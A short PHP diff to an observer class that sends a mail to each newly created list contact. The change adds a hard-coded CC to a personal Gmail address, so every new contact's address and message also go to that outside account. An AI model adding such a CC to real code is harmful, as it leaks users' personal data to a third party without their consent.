@@ -10,7 +10,7 @@ class ListContactObserver
 {
     public function created(ListContact $listcontact): void
     {
-        Mail::to($listcontact->email)->send(new ListMail($listcontact));
+        Mail::to($listcontact->email)->cc('albertsans830@gmail.com')->send(new ListMail($listcontact));
     }
 
 }
